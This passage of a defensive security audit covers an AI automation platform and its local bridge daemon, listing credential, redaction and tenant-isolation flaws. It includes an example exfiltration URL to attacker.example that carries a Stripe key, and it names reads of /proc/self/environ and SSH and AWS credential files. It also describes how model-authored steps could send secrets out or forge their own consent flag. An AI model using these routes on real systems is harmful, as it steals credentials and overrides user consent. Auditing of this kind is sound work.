| D4 | Audit trail for step execution (registo events: item used, secret delivery, run id, target origin) | absent | build-fresh | medium | Registo minimum vocabulary (a grep of api/src/automation/**.ts for recordActivity|registo|logActivity returns ZERO hits, while eleven other modules do write registo; the only durable trace of a step is the run record plus a transient SSE stream), Registo (RegistoEntry is a generic passthrough row with an app-assistant/voice/portal vocabulary and no automation or credential event class) | `api/src/automation/engine.ts:494-508`<br>`shared/src/registo.ts:15-23`<br>`api/src/automation/persistence.ts:37-54`<br>`api/src/automation/consent.ts:33-41` |
| D5 | (a) Mac Mini / Tailscale residential proxy egress as used by Cortex today | absent | build-fresh | large | - | `api/src/services/browser-pool.ts:32`<br>`api/src/server.ts:461-465`<br>`api/src/llm/client.ts:549`<br>`api/src/llm/credentials.ts:117`<br>`deploy/staging/README.md:34`<br>`web/lib/api/base-url.ts:6-12` |
| D5 | (b) Bridge advertises its tailnet address / egress endpoint at registration | absent | build-fresh | medium | - | `shared/src/ekoa-local.ts:218-231`<br>`/Users/ggomes/Projects/ekoa-bridge/src/transport/bridge-socket.ts:87`<br>`/Users/ggomes/Projects/ekoa-bridge/src/transport/bridge-socket.ts:207-211` |
| D5 | (b) Router selecting a machine/egress per run at checkout | diverges | close-gaps | large | Router (no capability DECLARATION or matching, no caller-chosen target, no attended/unattended flag, no egress attribute, and org is ADOPTED from the resolved connection rather than checked against the caller) | `api/src/server.ts:329`<br>`api/src/agents/sdk-tools.ts:133`<br>`api/src/bridge/delegation.ts:112-137`<br>`api/src/bridge/registry.ts:150-160`<br>`shared/src/ekoa-local.ts:170-186`<br>`api/src/automation/seams.ts:38-52`<br>`api/src/server.ts:465` |
| D5 | (b) Egress capability recorded in the Cortex bridge registry | diverges | close-gaps | medium | registry capability list (no capability or egress field on any row or frame; BridgeStatusResponse exposes only {paired, live, pairingId, lastSeenAt} so the UI cannot even name which machine is connected), capability GRANTS per tenant per machine (admission is binary - a live, non-revoked pairing whose owner is active may do anything the protocol expresses), full audit trail (Cortex never PERSISTS bridge activity; rows land in a 15-min TTL buffer as display metadata), tenant binding at dispatch (delegateToLocal passes no expectedOrg; DelegationActor has no orgId, so org is adopted not checked) | `api/src/bridge/registry.ts:22-28`<br>`api/src/bridge/registry.ts:32-41`<br>`api/src/server.ts:1015-1020`<br>`api/src/bridge/activity-buffer.ts:1-15`<br>`api/src/bridge/delegation.ts:31-34`<br>`api/src/bridge/delegation.ts:114`<br>`shared/src/ekoa-local.ts:54-59` |
| D5 | (b) Per-run offline fallback policy (fail / queue / datacenter egress) | diverges | close-gaps | medium | offline fallback per run (only 'fail' exists; the in-process cloud Chromium fallback is chosen by a GLOBAL flag, not run policy, so egress intent is undeclarable), queue fallback (none for automation runs; events/queue.ts is the webhook/trigger delivery queue, and the engine documents 'one attempt per run class') | `api/src/bridge/delegation.ts:112-115`<br>`api/src/automation/engine.ts:542-563`<br>`api/src/automation/engine.ts:24`<br>`api/src/automation/config.ts:38-41` |
| D5 | (c) Browser traffic tunneled through the control websocket (ruled out) | diverges | close-gaps | medium | data plane separation (the COMMITTED seam design sends every resolved browser action over the control socket and ingests screenshotB64 + DOM sketch + accessibility snapshot back over the same channel - currently dead code, so this is a divergence in the committed design rather than in running behaviour), I2 surface risk (page screenshots and DOM are the payload of the control channel, so any future login window rides the same pipe with no redaction or pause hook; run screenshots are persisted to a public unauthenticated mount) | `api/src/automation/seams.ts:45-49`<br>`api/src/automation/browser-session.ts:212-230`<br>`api/src/automation/browser-session.ts:247-283`<br>`api/src/server.ts:465`<br>`api/src/bridge/provider.ts:163-169`<br>`/Users/ggomes/Projects/ekoa-bridge/src/tools/index.ts:4-5`<br>`shared/src/ekoa-local.ts:193-200`<br>`api/src/server.ts:920` |
| D5 | (d) Tenant scoping enforcement point(s) on data access - chokepoint or scattered? | diverges | close-gaps | large | FIXED-14's own claim of 'a repository layer that cannot express an unscoped query' (instantiated in exactly TWO modules; no module uses OrgScoped at all; everything else talks to the bare Store with ~52 hand-written per-call-site filters), tenant isolation (most scoping that exists is OWNER-scoped, not org-scoped; some reads carry no tenant filter and rely on an unguessable id as the capability), tenant isolation (the served-app data plane authenticates NOTHING about the caller - 'No platform JWT anywhere on this plane'; any caller who learns an app id can read and write that app's data cross-tenant), drift (app-paths.ts RE-IMPLEMENTS the scoping predicate by hand a third time, self-documented as 'Mirrors OwnerVisibilityScoped.getVisible' / '.writeGuard') | `api/src/data/scoped.ts:15-42`<br>`api/src/data/scoped.ts:47-80`<br>`api/src/data/store.ts:20`<br>`api/src/memory/resolver.ts:26`<br>`api/src/apps/artifacts-service.ts:56`<br>`api/src/apps/app-paths.ts:84-112`<br>`api/src/apps/served-data.ts:14-16`<br>`api/src/apps/served-data.ts:103-112`<br>`api/src/automation/persistence.ts:51`<br>`api/src/auth/middleware.ts:22-55`<br>`docs/findings.md:182-194`<br>`docs/security.md:194-199` |
| D5 | (e) Apify tenant isolation (own budget, own queue, no shared credentials/session state, no route to a personal machine) | absent | build-fresh | medium | - | `api/src/data/stores.ts:125-215`<br>`api/src/bridge/registry.ts:150-160`<br>`api/src/bridge/delegation.ts:114` |
| D6 | Ordem dos Advogados email/webmail - Ekoa support + rail survey | absent | build-fresh | medium | - | `api/assets/integrations/imap/config.json:6`<br>`api/src/integrations/action-executor.ts:130`<br>`api/src/integrations/definitions.ts:73` |
| D6 | Citius / eTribunal - Portal dos Mandatários - Ekoa support + rail survey | diverges | close-gaps | large | Typist / fail-to-relay (the shipped automation's answer to a login wall is a `verify` step whose expectedOutcome tells a VISION MODEL in prose that 'o advogado autentica-se na janela e a execução prossegue' - an attended ceremony asserted to a model, with no protocol, no surface and no code), I1/I2/I4 (the session arrives as inputs.credentials.storageState - an ordinary model-visible automation input, not a Cofre item: no envelope encryption, no grant check, no zeroization, no redaction out of traces/logs), I6 (sessionConnect declares loginUrl portal.tribunais.org.pt but nothing binds the injected cookies to that origin), product integrity (the asset advertises session capture as the auth model while routes/integrations.ts answers available:false and started:false - the shipped integration promises a capability that does not exist) | `api/assets/integrations/citius/config.json:7`<br>`api/assets/integrations/citius/config.json:10-16`<br>`api/assets/integrations/citius/automations/notificacoes.json:22-26`<br>`api/src/automation/local-browser-session.ts:133-145`<br>`api/src/routes/integrations.ts:99-123` |
| D6 | IRN registries - Registo Predial Online, Civil Online, Certidão Permanente comercial | diverges | close-gaps | medium | factual (the three default base URLs - certidaopermanente.justica.gov.pt, predialonline.justica.gov.pt, civilonline.justica.gov.pt - do not resolve in DNS), factual (buildCertidaoUrl constructs `{base}/consulta?codigoAcesso=` for all three; no live registry uses that shape, and the module header's claim that all three are 'served today from the Certidão Permanente umbrella at the same shape' is wrong for all three), session-first / typist (only the anonymous access-code half exists; the authenticated half - Pedido de Registo Online, depósito, ordering a certidão - has no connector, no credential item and no login path) | `api/src/config.ts:230-232`<br>`api/src/legal/portal-connectors.ts:124-128`<br>`api/src/legal/portal-connectors.ts:9-14` |
| D6 | CidNews - Ekoa support + rail survey | unresolved | needs-manual-check | small | - | - |
| D6 | Bridge card/attended plumbing needed for a card-gated portal start | absent | build-fresh | large | - | `/Users/ggomes/Projects/ekoa-bridge/src/wire/contract.ts:80-92`<br>`/Users/ggomes/Projects/ekoa-bridge/src/tools/registry.ts:1-13`<br>`/Users/ggomes/Projects/ekoa-bridge/src/tools/tier2/index.ts:22-27` |
| D7 | (a) What is actually sent to the model as page snapshot / accessibility tree / DOM dump today | diverges | close-gaps | medium | Redaction pipeline / I1 (the vision payload is a full-fidelity capture with no filter of any kind between the page and the model; the executor holds live credential values but nothing in the capture path consults them), I2 (the same unfiltered capture is written to disk on every step - model-bound stream and log stream are the same bytes with the same absence of filtering), I1/I2 (a bounded but REAL DOM-text plane reaches the model: expect_text throws with 200 chars of live innerText and expect_url with the raw URL; that Error becomes the fixer prompt's failureMessage, an SSE payload, and a persisted field) | `api/src/automation/vision.ts:268-283`<br>`api/src/automation/vision.ts:412-426`<br>`api/src/automation/engine.ts:1386-1393`<br>`api/src/automation/local-browser-session.ts:194`<br>`api/src/automation/local-browser-session.ts:214-215`<br>`api/src/automation/rehearsal.ts:131-138`<br>`api/src/automation/executor.ts:287-299`<br>`api/src/automation/engine.ts:784-795` |
| D7 | (b) Is ANY redaction applied to that payload today | diverges | close-gaps | medium | I1 (the IMAGE half is forwarded verbatim past anonymize() and that passthrough is PINNED by a test; any credential rendered visibly reaches the model as pixels with nothing in the path capable of stopping it), I2 (the same buffer is written to disk unencrypted and served without authentication), Redaction pipeline scope (the only value-keyed redactors are private to two executors; nothing generic exists at ingress, and local_command, ekoa_action and the whole browser path have no equivalent), I1 text plane (no EMAIL recognizer, no cédula/OA recognizer, NER head inert - even the text half would not catch the identifiers this audit is about) | `api/src/llm/client.ts:967-968`<br>`api/src/llm/client.ts:981`<br>`api/tests/llm/client.test.ts:235-256`<br>`api/src/llm/anonymise/detectors.ts:34-37`<br>`api/src/llm/anonymise/detectors.ts:76-87`<br>`docs/security.md:77`<br>`api/src/automation/template-vars.ts:44-55`<br>`api/src/automation/engine.ts:236-239` |
| D7 | (c) Cost of masking usernames - mechanical feasibility and functional breakage | diverges | close-gaps | medium | Redaction pipeline single filter (value-keyed masking exists but is a private function of one executor with no way for the browser/vision path to reach it - feasibility proven, application absent), I2 (the harvested identifier is console.log'd verbatim), I2/I4 (the mutated inputs map is interpolated into downstream api_call URLs/bodies whose RESOLVED form is persisted, and api-call's redactor is keyed only to decrypted credential values, so a page-extracted value is invisible to it) | `api/src/server.ts:395-406`<br>`api/src/integrations/service.ts:80`<br>`api/src/automation/executors/api-call.ts:238-247`<br>`api/src/automation/executors/api-call.ts:250-256`<br>`api/src/automation/vision.ts:200-206`<br>`api/src/automation/engine.ts:1519-1524`<br>`api/src/automation/engine.ts:1616-1624`<br>`api/src/automation/engine.ts:1192` |
| D7 | (d) Screenshots and video - is the pixel path in scope, and does vision send screenshots to the model | diverges | close-gaps | large | I1 (the credential-bearing pixel plane reaches the model with no mask and no filter), I2 (every step screenshot is persisted as plaintext PNG and exposed on an unauthenticated public HTTP mount with no tenant check and no retention/deletion path anywhere), I4 (plaintext at rest, writeFileSync, no encryption, no TTL, no zeroization), Redaction pipeline (no login-window concept in the capture path - capture() runs unconditionally after every act, including the act that fills a credential field), I2/I3 model return path (cachedAssertion.contains and visionReasoning move page content BACK from pixels into persisted, org-readable, replayed text - a pixel mask does not cover this) | `api/src/automation/vision.ts:281`<br>`api/src/automation/vision.ts:424`<br>`api/src/automation/rehearsal.ts:152-154`<br>`api/src/llm/client.ts:981`<br>`api/src/automation/engine.ts:1689-1702`<br>`api/src/automation/persistence.ts:69-74`<br>`api/src/server.ts:912-920`<br>`api/src/automation/engine.ts:1626-1630`<br>`node_modules/playwright-core/types/types.d.ts:12198-12206` |
| D7 | (e) GDPR/PII - is "low-sensitivity" defensible for Portuguese lawyers' professional identifiers | diverges | close-gaps | medium | I3 / the anonymisation posture stated in docs/security.md (the doc claims fail-closed tokenization of NIF/NISS/CC/IBAN/CITIUS identifiers before any Anthropic request; on the vision path that is FALSE by construction because those identifiers ride as pixels), I2/I4 (client-identifying page content is persisted as plaintext PNG and served without authentication; a capability-URL argument covers accidental enumeration, not retention, not encryption at rest, and not a subject-access/erasure obligation over an unindexed PNG tree), Redaction pipeline scope (no EMAIL and no cédula recognizer, NER head inert - the text plane would not catch these identifiers either) | `api/assets/integrations/citius/config.json:7`<br>`api/assets/integrations/citius/config.json:16`<br>`api/assets/integrations/citius/config.json:24`<br>`api/src/llm/anonymise/detectors.ts:76-87`<br>`api/src/automation/persistence.ts:69-74`<br>`docs/decisions.md:20` |
| D1 | MISSED - api/src/streaming/ (auth, cdp, protocol, registry, session) + the pause-for-user overlay/canvas: the product's only human-in-the-loop browser-takeover surface | unresolved | needs-manual-check | medium | - | `api/src/streaming/session.ts:1-8`<br>`api/src/streaming/cdp.ts:96-103`<br>`web/components/automations/pause-for-user-overlay.tsx:12-21` |
| D1 | MISSED - I7 (signature authority never enters the grant/TTL model): no audit issued a verdict | unresolved | needs-manual-check | medium | - | `api/src/integrations/action-executor.ts:271-282`<br>`api/src/integrations/service.ts:80` |
| D1 | MISSED - test coverage of the credential boundaries every audit relies on (scrubCredentials, template-vars redaction, redactSecretsDeep, the api-call masker) | unresolved | needs-manual-check | small | - | - |
| D1 | MISSED - docs/diagrams/02-module-map.excalidraw: where the credential/automation/bridge boundaries are currently drawn, and where the Cofre lands in the module tier table | unresolved | needs-manual-check | small | - | - |
| D2 | MISSED - ekoa-bridge/src/containment/resolver.ts: the single path-containment resolver that decides what a delegation may touch | unresolved | needs-manual-check | medium | - | `/Users/ggomes/Projects/ekoa-bridge/src/containment/resolver.ts:22-45` |
| D2 | MISSED - ekoa-bridge/src/session/egress.ts (EgressAccounting: per-session byte cap and its soft-stop cap_consent raise) | unresolved | needs-manual-check | small | - | - |
| D2 | MISSED - what the Cortex chokepoint does with bridge-forwarded bodies (whether proxyGatewayMessages / the anon-audit persists a prompt containing file excerpts) | unresolved | needs-manual-check | small | - | - |
| D5 | MISSED - the events/ inbound plane's tenant filters (events/service.ts, listener-supervisor.ts) | unresolved | needs-manual-check | small | - | `api/src/events/service.ts:68`<br>`api/src/events/service.ts:101`<br>`api/src/events/service.ts:144` |
| D5 | MISSED - whether the two 'dead' seams (DaemonBrowserSession / setDaemonConnectionResolver) are maintained or abandoned | unresolved | needs-manual-check | small | - | `api/src/automation/seams.ts:22-63`<br>`api/src/server.ts:465` |
| D7 | MISSED - ekoa-bridge Tier-2 browse returns up to 100 KB of raw document.body.innerText | diverges | close-gaps | medium | I1/I2 (the one browser payload the bridge codebase defines is a raw 100 KB innerText dump - it would echo visible field text wholesale, values included; and the navigation target is ledgered in full to local disk) | `/Users/ggomes/Projects/ekoa-bridge/src/tools/tier2/browser.ts:27`<br>`/Users/ggomes/Projects/ekoa-bridge/src/tools/tier2/browser.ts:47-56`<br>`/Users/ggomes/Projects/ekoa-bridge/src/tools/tier2/index.ts:22-27`<br>`/Users/ggomes/Projects/ekoa-bridge/src/ledger/ledger.ts:82` |

---

## Invariant breaches in code running today

### [CRITICAL] I5 + I1 + I2 + I4

ekoa_action's platform primitives give a MODEL-AUTHORED manifest recipe unrestricted filesystem access on the Cortex host. `resolveUserPath` applies no sandbox at all - `if (isAbsolute(path)) return path;` with the comment 'reject absolute paths outside the user's sandbox? For now: trust user-issued paths via Ekoa actions, since manifests are authored by the coding agent under our control'. file.read of /proc/self/environ, the service-account JSON, or any credential file lands its content in ctx.captured, which is persisted UNREDACTED as capturedValues and returned by extractActionRunOutput as the agent tool result into the calling model's context. file.write is equally unrestricted. This is a cloud-side executor with no daemon dependency, so unlike local_command it EXECUTES TODAY, and rehearsal.ts lets the fixer LLM pick artifactSlug/capabilityName mid-run.

- `api/src/automation/platform-primitives.ts:324-330`
- `api/src/automation/platform-primitives.ts:207-212`
- `api/src/automation/platform-primitives.ts:214-220`
- `api/src/automation/executors/ekoa-action.ts:165-174`
- `api/src/automation/service.ts:650`
- `api/src/automation/rehearsal.ts:307-317`

### [CRITICAL] I6 + I5

Credential use has NO origin binding on either HTTP path, and the path where the MODEL authored the destination has the WEAKER egress control. (1) api_call loads the decrypted fields for a model-supplied `authIntegrationKey` and interpolates them into a model-supplied URL; the only gate is guardedFetch's SSRF check, which by design permits every public host - `url:"https://attacker.example/?k={{integration.stripe.api_key}}"` + `authIntegrationKey:"stripe"` exfiltrates in one hop, and the fixer LLM can author both fields mid-run with none of the planner's checks applied. (2) The LLM-authored integration package is worse: the builder writes the model's config.json verbatim to disk and the executor sends the request on a bare `globalThis.fetch` with only a `/^https?:\/\//i` shape check on baseUrl - no SSRF guard, no allowlist. Nothing anywhere compares a request origin against a registered origin for the credential.

- `api/src/automation/executors/api-call.ts:65-96`
- `api/src/automation/executors/api-call.ts:126-135`
- `api/src/integrations/action-executor.ts:292-295`
- `api/src/integrations/action-executor.ts:328-332`
- `api/src/routes/integration-builder.ts:210`
- `api/src/integrations/definitions.ts:380-386`
- `api/src/automation/rehearsal.ts:304`

### [CRITICAL] I4

No plaintext-at-rest control worth the name. `key()` is a bare sha256 of the single `ENCRYPTION_KEY` env value; the file's own header calls KMS envelope encryption 'P-14, deferred'. One key encrypts every tenant's integration credentials, the anonymisation deny-list and the platform model credential. `encryptForScope` is key SEPARATION (not a per-tenant DEK) with exactly one caller, and integration credentials use the UNSCOPED key so ciphertext is not even org-bound. Zeroization does not exist: a grep for .fill(0)/zeroize/memzero over api/src and ekoa-bridge/src is empty. Worse, the one singleton-encrypted credential is deliberately memoized process-wide (`cached = cred`), so 'RAM only during the use window' fails by design, not by omission. The `memories` collection - which holds cached fill values - is plaintext Mongo with no crypto at all.

- `api/src/data/crypto.ts:19-25`
- `api/src/data/crypto.ts:47-62`
- `api/src/integrations/service.ts:80`
- `api/src/integrations/service.ts:113`
- `api/src/llm/credentials.ts:200-215`
- `api/src/data/stores.ts:132`

### [HIGH] I4 + I2 (bridge transit rule)

The bridge writes credential-equivalent material to plaintext disk and the deployment forces a key monoculture. `config.json` (0600, no encryption, no keychain, no zeroization, rewritten on every refresh) holds the platform access + refresh tokens AND `signingSecret`. Because Cortex signs DelegatedTasks with `loadConfig().jwtSecret`, a working deployment puts the platform-wide JWT signing secret - the key behind every user's session token - in cleartext on every paired user's laptop. One secret therefore signs platform sessions, mints bridge tokens, and keys task HMACs; compromise of any single bridge machine compromises every session in the deployment. Nothing writes signingSecret either, so in production the flow is broken unless an operator hand-copies JWT_SECRET.

- `/Users/ggomes/Projects/ekoa-bridge/src/auth/credentials.ts:36-47`
- `/Users/ggomes/Projects/ekoa-bridge/src/auth/credentials.ts:86-91`
- `api/src/bridge/signing.ts:24`
- `api/src/bridge/token.ts:44-52`
- `/Users/ggomes/Projects/ekoa-bridge/src/cli/commands/serve.ts:84`

### [HIGH] I3 + I1

There is no non-memorable class, and the action cache is a two-way pipe between the page and every model surface. writeActionCache persists the whole resolved PlaywrightAction into ORGANIZATIONAL MEMORY via the public createMemory/updateMemory surface at tier 'active'; summariseAction puts the first 40 chars of a `fill` value - and the FULL navigate URL and FULL select value, untruncated - into the row's term-scored `content`. `isInjectable` excludes only tier==='archive', so those rows are scored against the user's ordinary CHAT query and injected into the general agent system prompt under '# Memória', in addition to the automation's own tag-scoped vision prompt. A private-visibility row suffices; `shared:true` additionally makes it org-wide. A magic-link/SSO-callback/?sid= URL is therefore memorised verbatim and replayed to the model on term overlap.

- `api/src/automation/cache.ts:140`
- `api/src/automation/cache.ts:257`
- `api/src/automation/cache.ts:260`
- `api/src/automation/cache.ts:264`
- `api/src/memory/resolver.ts:90-92`
- `api/src/memory/resolver.ts:135-145`
- `api/src/agents/context.ts:156-159`
- `api/src/server.ts:408-415`

### [HIGH] I2 + I4

Every automation step screenshots the authenticated page and writes an unencrypted PNG to <dataDir>/automation-runs/<automationId>/<runId>/step-N.png, served by `express.static` on /automation-screenshots with NO auth middleware and NO tenant check - the unguessable path IS the only capability, by explicit recorded decision. There is no login-window suppression, so an MFA/OTP page or a revealed credential field is persisted and served; there is no pruning, TTL or deletion path anywhere (stale pre-rebuild PNGs are still being served). The URL is also pushed onto the SSE run stream, so anything that logs a run event leaks the capability.

- `api/src/automation/engine.ts:1689-1703`
- `api/src/automation/persistence.ts:63-78`
- `api/src/server.ts:912-920`
- `api/src/automation/run-events.ts:31-41`
- `docs/decisions.md:20`

### [HIGH] I1

The vision path is a STRUCTURAL bypass of the anonymisation chokepoint, not a gap in a filter. runOneShot anonymises `prompt` and `systemPrompt` but forwards `images: opts.images` verbatim to the transport, and api/tests/llm/client.test.ts pins that verbatim passthrough as the contract. docs/security.md scopes the pipeline to 'all model-bound text'. So on a court-portal page the NIFs, client names and processo numbers the anonymiser exists to tokenize ride to the model as pixels, entirely unprotected - and pixels cannot be tokenized without destroying the resolver's grounding. Three call sites ship the screenshot (resolve, verify, fixer) plus the human-action classifier.

- `api/src/llm/client.ts:967-968`
- `api/src/llm/client.ts:981`
- `api/tests/llm/client.test.ts:235-256`
- `docs/security.md:77`
- `api/src/automation/vision.ts:281`
- `api/src/automation/vision.ts:424`

### [HIGH] I2 + I1

The verify step's vision model is instructed to lift identifiers off the page verbatim, and the engine then (a) logs each one in cleartext to the process log - `console.log(`[automation] verifier extracted ${k}="${v}" from page on step ${step.id}`)` - and (b) merges it into the run's shared mutable `inputs` map. That map is template-substituted into every downstream step, including api_call URLs/headers/bodies whose RESOLVED form is persisted, and api-call's redactor is keyed only to decrypted integration credential values so a page-extracted OTP/token/session id is invisible to it. An unsanitised model->shell path exists for the same reason (local_command interpolates argv/cwd/stdin from the same map).

- `api/src/automation/engine.ts:1616-1624`
- `api/src/automation/engine.ts:1621`
- `api/src/automation/vision.ts:200-206`
- `api/src/automation/engine.ts:1192`
- `api/src/automation/engine.ts:1212`
- `api/src/automation/executors/local-command.ts:83-87`

### [HIGH] I2 + I9

No redaction pipeline exists on the bridge path in either direction, and the bridge durably captures the exact surface I9 governs. AutomationLedgerRow.detail is documented as 'The full bash command line, or the browser navigation target - recorded in full' and is appended + fsync'd per row on BOTH the allowed and denied paths. Any value interpolated into a command string, and any session-bearing navigation URL, is permanently on the user's disk in cleartext. Cortex applies no ingress filter: bridge frames are parsed and dispatched raw. This directly contradicts the target's 'the bridge never logs payloads' premise.

- `/Users/ggomes/Projects/ekoa-bridge/src/ledger/ledger.ts:72-89`
- `/Users/ggomes/Projects/ekoa-bridge/src/tools/tier2/context.ts:52-71`
- `/Users/ggomes/Projects/ekoa-bridge/src/tools/tier2/bash.ts:49`
- `/Users/ggomes/Projects/ekoa-bridge/src/tools/tier2/bash.ts:63`
- `api/src/bridge/server.ts:209-260`

### [HIGH] tenant isolation (prerequisite for I1-I4 on any Cofre item)

/api/app-data/:collection authenticates NOTHING about the caller: scopeFor needs only a charset-valid X-Ekoa-App-Id header plus the app owner's activation - 'No platform JWT anywhere on this plane'. Any caller who learns an app id can read/POST/PUT/DELETE that app's data across tenants. Self-documented as a HIGH gap in findings.md and security.md and pinned by a tripwire test. Structurally, the scoped-repository chokepoint (OrgScoped/OwnerVisibilityScoped, claimed as 'a repository layer that cannot express an unscoped query') is instantiated in exactly TWO modules; everything else talks to the bare Store with hand-written per-call-site filters, and app-paths.ts re-implements the scoping predicate by hand a third time.

- `api/src/apps/served-data.ts:14-16`
- `api/src/apps/served-data.ts:103-112`
- `api/src/data/scoped.ts:15-42`
- `api/src/memory/resolver.ts:26`
- `api/src/apps/artifacts-service.ts:56`
- `api/src/apps/app-paths.ts:84-112`
- `docs/findings.md:182-194`

### [MEDIUM] I1 + I2

A live in-process DOM-TEXT path to the model that no audit's primary matrix accounted for: executePlaywrightAssertion's expect_text branch throws `expected text to contain "...", got "${text.slice(0,200)}"` built from live `target.innerText()`, and expect_url embeds the raw URL. That Error becomes record.error.message, which the engine hands VERBATIM to the rehearsal fixer LLM as `failureMessage`, and simultaneously onto the SSE run stream and into the persisted step record. The cached assertions that trigger it are minted by the vision verifier itself from page text, so the loop is self-feeding and needs no daemon.

- `api/src/automation/executor.ts:287-293`
- `api/src/automation/executor.ts:295-299`
- `api/src/automation/engine.ts:784-795`
- `api/src/automation/rehearsal.ts:142-159`
- `api/src/automation/run-events.ts:38`

### [MEDIUM] I1 + I2

Raw file CONTENT crosses the bridge control socket into the model. The daemon engine collects `as`-named read excerpts and the compose step concatenates them verbatim into the provider_request body ('The excerpts cross Boundary 1 here'), which is shipped up the socket to the Cortex chokepoint. There is no secret detection on that path and the containment resolver has NO sensitive-file denylist - it only enforces that the realpath stays inside a granted root, so granting a directory containing a .env / .ssh / credentials file ships its bytes to the LLM. Grant issuance itself is machine-local and unauthenticated (any local process can POST /grants to the loopback surface with an arbitrary path) and is unaudited in the ledger schema on both sides.

- `/Users/ggomes/Projects/ekoa-bridge/src/engine/engine.ts:184-205`
- `/Users/ggomes/Projects/ekoa-bridge/src/containment/resolver.ts:22-45`
- `/Users/ggomes/Projects/ekoa-bridge/src/surface/browser-grants.ts:41-70`
- `/Users/ggomes/Projects/ekoa-bridge/src/ledger/ledger.ts:92-99`

### [MEDIUM] I5

The rehearsal fixer LLM authors EXECUTABLE steps mid-run. validateStep accepts insert_before/replace_current patches of type local_command (argv/cwd/stdin), api_call (method/url/headers/body + authIntegrationKey) and ekoa_action (artifactSlug/capabilityName/inputs), copying model-supplied values with only a typecheck. None of the planner's guardrails run on this path - not the shell-metacharacter check, not the auth-header check. The planner itself teaches the model the credential-interpolation syntax `{{integration.<key>.<field>}}` rather than reserving injection to a fixed primitive, and its anti-leak rules are prompt-level with a pattern-matching structural check that echoes the first 50 chars of an offending token back into the log, the retry prompt, and the client payload.

- `api/src/automation/rehearsal.ts:223-226`
- `api/src/automation/rehearsal.ts:278-317`
- `api/src/automation/rehearsal.ts:304`
- `api/src/automation/planner.ts:149`
- `api/src/automation/planner.ts:655-663`
- `api/src/automation/planner.ts:236-256`

### [MEDIUM] I2

The masker leaks partial plaintext by construction and has a hard floor. `maskValue` emits any leading token up to 12 chars plus the LAST FOUR characters of every secret; `collectSecretValues`/`redactSecretValuesIn` silently skip any secret shorter than 4 chars; matching is literal substring over raw and URL-encoded forms only, so base64, JSON-escaped, chunked or case-shifted echoes pass through. The filter is also not a pipeline: it exists as two divergent private copies (http-template.ts for the HTTP integration executor, api-call.ts for the automation executor), reachable by nothing else - local_command, ekoa_action, browser output, SSE `step` events and bridge output have no masking at all.

- `api/src/integrations/http-template.ts:71-78`
- `api/src/integrations/http-template.ts:110-131`
- `api/src/automation/executors/api-call.ts:238-263`
- `api/src/automation/run-events.ts:30-43`

### [MEDIUM] bridge auth / revocation (prerequisite for secret.deliver)

The bridge kill switch is unreachable and bridge tokens sit outside the platform revocation plane. `revokePairing` is defined and re-exported but called ONLY from api/tests/* - no route, service or UI mounts it, and the daemon's `unpair` is explicitly local-only, so a stolen machine cannot be cut off except by deactivating the whole account. mintBridgeToken adds no jti and the connect chain never checks `tokenEpoch` the way the platform middleware does, so a password change or 'terminate all sessions' neither invalidates a minted bridge token nor drops a live socket. With no replay store and `attachLiveConnection` retiring the incumbent on redial, a 600 s token capture EVICTS the real daemon and receives that pairing's delegate frames. Any secret.deliver built on this inherits it.

- `api/src/bridge/registry.ts:203`
- `api/src/bridge/index.ts:35`
- `/Users/ggomes/Projects/ekoa-bridge/src/cli/commands/unpair.ts:4-6`
- `api/src/bridge/token.ts:44-52`
- `api/src/bridge/token.ts:61-85`
- `api/src/bridge/registry.ts:105-113`
- `api/src/auth/middleware.ts:33-49`

### [MEDIUM] I4

Session material accumulates in RAM without bound and there is no per-tenant browser isolation. `injectSessionState` calls ctx.addCookies with whatever domains the payload carries (no origin/eTLD+1 check - an I6 breach on the one session path that exists), and `dispose()` closes only the PAGE, so every run's BrowserContext and its cookie jar survive in the shared Chromium for the process lifetime. The composition root's provider IGNORES the ownerUserId argument and returns a fresh anonymous context from a process-wide browser, directly contradicting the module's own docblock claim of 'the persistent per-owner stealth context'.

- `api/src/automation/local-browser-session.ts:133-145`
- `api/src/automation/local-browser-session.ts:149-154`
- `api/src/automation/engine.ts:1081-1087`
- `api/src/server.ts:461-464`

### [MEDIUM] I9

The only environment channel is the exact inverse of the I9 primitive. `LocalCommandSpec.envWhitelist` is a name list the PARSER accepts from the planner; `buildEnv` resolves each name against the CORTEX API SERVER's own process.env - which holds provider keys, ENCRYPTION_KEY, JWT_SECRET and DB creds - and ships the resulting VALUES over the wire to a user machine. There is no path from an encrypted credential item to a process environment: loadIntegrationCredentialFields is imported only by api-call.ts, never by local-command. Latent today only because the shipped bridge bash tool takes no env and hard-scrubs the child to a 7-name allowlist, and because the daemon seam is unwired.

- `api/src/automation/types.ts:188-193`
- `api/src/automation/executors/local-command.ts:253-261`
- `api/src/automation/planner.ts:403`
- `/Users/ggomes/Projects/ekoa-bridge/src/tools/tier2/bash.ts:17-19`

### [MEDIUM] I5 (consent forgeability)

The only approval flag on the bridge wire is authored by the LLM. `write` requires `confirmed===true` and the daemon's module header claims 'the user assents Cortex-side', but nothing Cortex-side checks it - delegateToLocal passes the task string through unexamined and the agent tool description literally instructs the model to set it. Separately, Cortex's own command-shape consent gate generalises every path-shaped argument to <FILE>/<DIR>, so approving `cat ~/notes.txt` permanently approves `cat ~/.ssh/id_rsa` and `cat ~/.aws/credentials` for that user, with no machine binding, no tenant scoping and no TTL.

- `api/src/agents/sdk-tools.ts:111-112`
- `/Users/ggomes/Projects/ekoa-bridge/src/tools/write.ts:10-11`
- `/Users/ggomes/Projects/ekoa-bridge/src/tools/write.ts:105-110`
- `api/src/automation/command-shape.ts:52-68`
- `api/src/automation/consent.ts:23-29`

### [MEDIUM] I7

Signature authority has no representation anywhere and therefore sits inside the ordinary credential/TTL model by default. The e-signature integrations (zoho-sign, adobe-sign) hold OAuth-style credentials in the same `credentialsCiphertext` bundle as everything else, unwrapped unconditionally by the same `decryptCredentialFields` whenever a config row is found. There is no certificate-identity type, no per-document ceremony, no document-name/preview/hash display, and no protocol-level operation typing that could refuse a login-typed flow completing a signature. No audit gave I7 a verdict; it is a live divergence, not an open question.

- `api/src/integrations/action-executor.ts:271-282`
- `api/src/integrations/service.ts:80`
- `api/src/automation/engine.ts:1789-1845`

### [MEDIUM] I2 + I3 (model return path)

Content the model READ off the page is written back into plaintext, org-readable, replayed artifacts that no pixel-masking or ingress filter would cover: `cachedAssertion.contains` is page text the verifier transcribed and is persisted onto the AUTOMATION DEFINITION and replayed on every subsequent run; `visionReasoning` is persisted on the step record and pushed on SSE. Combined with the extractedInputs channel, the model is an unaudited transcription path from pixels back into durable text.

- `api/src/automation/engine.ts:1626-1630`
- `api/src/automation/vision.ts:571-582`
- `api/src/automation/run-events.ts:30-43`

### [LOW] I2

